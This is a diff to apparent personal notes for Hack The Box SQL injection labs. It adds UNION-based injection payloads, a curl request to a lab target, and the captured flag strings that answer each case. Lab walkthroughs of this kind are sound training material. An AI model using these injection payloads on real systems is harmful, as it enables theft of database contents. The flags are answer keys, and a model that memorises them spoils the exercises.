@@ -171,3 +171,8 @@ ANSWER flag6: HTB{v1nc3_mcm4h0n_15_4570n15h3d}
 ## Case 7 (GET id, UNION, 5 columns)
   id=0 union select 1,2,3,4,(select content from flag7)
 ANSWER flag7: HTB{un173_7h3_un173d}
+
+---
+# SQLMap Essentials Case 1 (target 154.57.164.79:40261) - GET id, UNION (6 cols)
+curl ".../case1.php?id=0 union select 1,2,3,4,5,(select content from flag1)"
+ANSWER flag1: HTB{c0n6r475_y0u_kn0w_h0w_70_run_b451c_5qlm4p_5c4n}
